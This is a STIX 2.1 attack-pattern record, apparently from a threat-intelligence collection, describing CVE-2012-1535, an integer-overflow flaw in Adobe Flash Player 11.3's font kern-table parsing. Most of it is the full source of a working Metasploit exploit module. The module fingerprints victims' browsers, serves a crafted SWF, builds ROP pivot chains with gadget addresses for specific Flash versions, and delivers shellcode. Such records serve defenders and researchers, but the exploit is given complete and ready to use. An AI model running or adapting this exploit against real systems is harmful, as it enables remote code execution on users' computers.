{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c0fe7d74-5cfa-43f1-b529-ea6b654fda21",
    "created": "2024-08-14T16:39:54.733488Z",
    "modified": "2024-08-14T16:39:54.733492Z",
    "name": "\"Adobe Flash Player 11.3 Kern Table Parsing Integer Overflow\"",
    "description": " This module exploits a vulnerability found in the ActiveX component of Adobe Flash Player before 11.3.300.271. By supplying a specially crafted .otf font file with a large nTables value in the 'kern' header, it is possible to trigger an integer overflow, which results in remote code execution under the context of the user.  This vulnerability has also been exploited in the wild in limited targeted attacks.  Please note in order to ensure reliability, the exploit is forced to modify your URIPATH parameter to less than 3 characters, which may cause possible URIPATH collisions.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_otf_font.rb",
            "external_id": "adobe_flash_otf_font.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1535"
        },
        {
            "source_name": "reference",
            "url": "http://labs.alienvault.com/labs/index.php/2012/cve-2012-1535-adobe-flash-being-exploited-in-the-wild/"
        },
        {
            "source_name": "reference",
            "url": "https://developer.apple.com/fonts/TTRefMan/RM06/Chap6.html"
        },
        {
            "source_name": "reference",
            "url": "http://contagiodump.blogspot.com.es/2012/08/cve-2012-1535-samples-and-info.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/08/17/adobe-flash-player-exploit-cve-2012-1535-now-available-for-metasploit"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb12-18.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player 11.3 Kern Table Parsing Integer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in the ActiveX component of Adobe\n        Flash Player before 11.3.300.271. By supplying a specially crafted .otf font file\n        with a large nTables value in the 'kern' header, it is possible to trigger an\n        integer overflow, which results in remote code execution under the context of the\n        user.  This vulnerability has also been exploited in the wild in limited targeted\n        attacks.  Please note in order to ensure reliability, the exploit is forced to\n        modify your URIPATH parameter to less than 3 characters, which may cause possible\n        URIPATH collisions.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Alexander Gavrun', #Through iDefense\n          'sinn3r',\n          'juan vazquez'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-1535' ],\n          [ 'OSVDB', '84607'],\n          [ 'BID', '55009'],\n          [ 'URL', 'http://labs.alienvault.com/labs/index.php/2012/cve-2012-1535-adobe-flash-being-exploited-in-the-wild/' ],\n          [ 'URL', 'https://developer.apple.com/fonts/TTRefMan/RM06/Chap6.html' ],\n          [ 'URL', 'http://contagiodump.blogspot.com.es/2012/08/cve-2012-1535-samples-and-info.html' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/08/17/adobe-flash-player-exploit-cve-2012-1535-now-available-for-metasploit' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb12-18.html']\n        ],\n      'Payload'        =>\n        {\n          'Space' => 1024\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested successfully on:\n          # Flash 11.2.202.233\n          # Flash 11.3.300.268\n          # Flash 11.3.300.265\n          # Flash 11.3.300.257\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3',    {'Rop' => nil } ],\n          [ 'IE 7 on Windows XP SP3',    {'Rop' => nil } ],\n          [ 'IE 8 on Windows XP SP3',    {'Rop' => true, 'ASLR' => false } ],\n          [ 'IE 7 on Windows Vista SP2', {'Rop' => nil }],\n          [ 'IE 8 on Windows 7 SP1',     {'Rop' => true, 'ASLR' => true } ],\n          [ 'IE 9 on Windows 7 SP1',     {'Rop' => true, 'ASLR'   => true } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-08-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptEnum.new('ROP', [true, \"The ROP chain to use\", 'SWF', %w(SWF JRE)]),\n      ])\n  end\n\n  def get_payload(t, flash_version=nil)\n    if t['Rop'].nil?\n      p = [\n        0x0c0c0c0c, # mapped at 1e0d0000\n        0x0c0c0c0c,\n        0x0c0c0c0c, # mapped at 1e0d0008\n      ].pack(\"V*\")\n\n      p << payload.encoded\n      return p\n    end\n\n    if t['ASLR'] == false and datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,257/\n      print_status(\"Using Rop Chain For Flash: #{flash_version}\")\n      pivot = [\n        0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)\n        0x0c0c0c0c,\n        0x1001d891, # xchg eax, esp # ret (1e0d0008)\n      ].pack(\"V*\")\n\n      p = generate_rop_payload('flash', payload.encoded, {'target'=>'11.3.300.257', 'pivot'=>pivot})\n\n    elsif t['ASLR'] == false and datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,265/\n      print_status(\"Using Rop Chain For Flash: #{flash_version}\")\n      pivot = [\n        0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)\n        0x0c0c0c0c,\n        0x1001d6d3, # xchg eax, esp # ret (1e0d0008)\n      ].pack(\"V*\")\n\n      p = generate_rop_payload('flash', payload.encoded, {'target'=>'11.3.300.265', 'pivot'=>pivot})\n\n    elsif t['ASLR'] == false and datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,268/\n      print_status(\"Using Rop Chain For Flash: #{flash_version}\")\n      pivot = [\n        0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)\n        0x0c0c0c0c,\n        0x1001d755, # xchg eax, esp # ret (1e0d0008)\n      ].pack(\"V*\")\n\n      p = generate_rop_payload('flash', payload.encoded, {'target'=>'11.3.300.268', 'pivot'=>pivot})\n\n    else\n      print_status(\"Default back to JRE ROP\")\n      pivot = [\n        0x7c34a028, # POP EDI # POP ESI # RETN (1e0d0000)\n        0x0c0c0c0c,\n        0x7c348b05, # xchg eax, esp # ret (1e0d0008)\n      ].pack(\"V*\")\n\n      p = generate_rop_payload('java', payload.encoded, {'pivot'=>pivot})\n    end\n\n    return p\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[4]  #IE 7 on Windows Vista SP2\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8/\n      return targets[5]  #IE 8 on Windows 7 SP1\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 9/\n      return targets[6]  #IE 9 on Windows 7 SP1\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target selected: #{my_target.name}\")\n    print_status(\"Client requesting: #{request.uri}\")\n\n    # The SWF request itself\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending SWF\")\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash'})\n      return\n    end\n\n    # The TXT payload request\n    if request.uri =~ /\\.txt$/\n      flash_version = request.headers['x-flash-version']\n      shellcode = get_payload(my_target, flash_version).unpack('H*')[0]\n      print_status(\"Sending Payload\")\n      send_response(cli, shellcode, { 'Content-Type' => 'text/plain' })\n      return\n    end\n\n    #swf_uri = get_resource() + Rex::Text.rand_text_alphanumeric(rand(8)+4) + \".swf\"\n    swf_uri = \"/#{@resource_name}.txt.swf\"\n\n    html = %Q|\n    <html>\n    <head>\n    </head>\n    <body>\n    <object width=\"1\" height=\"1\" type=\"application/x-shockwave-flash\" data=\"#{swf_uri}\">\n    <param name=\"movie\" value=\"#{swf_uri}\">\n    <param name=\"FlashVars\" value=\"s=#{@resource_name}\">\n    </object>\n    </body>\n    </html>\n    |\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending HTML\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\n  def primer\n    # we need to handle direct /pay.txt requests\n    hardcoded_uripath(\"/#{@resource_name}.txt\")\n  end\n\n  def exploit\n    @swf = create_swf\n    @resource_name = Rex::Text.rand_text_alpha(5)\n    vprint_status(\"SWF Loaded: #{@swf.length.to_s} bytes\")\n\n    datastore['URIPATH'] = datastore['URIPATH'] || random_uri\n    datastore['URIPATH'] = '/' + datastore['URIPATH'] if datastore['URIPATH'] !~ /^\\//\n    datastore['URIPATH'] = datastore['URIPATH'][0,3] if datastore['URIPATH'].length > 3\n    print_warning(\"URIPATH set to #{datastore['URIPATH']}\")\n\n    super\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2012-1535\", \"Main.swf\" )\n    fd = ::File.open( path, \"rb\" )\n    swf = fd.read(fd.stat.size)\n    fd.close\n    return swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-09",
    "x_mitre_platforms": [
        "win'"
    ]
}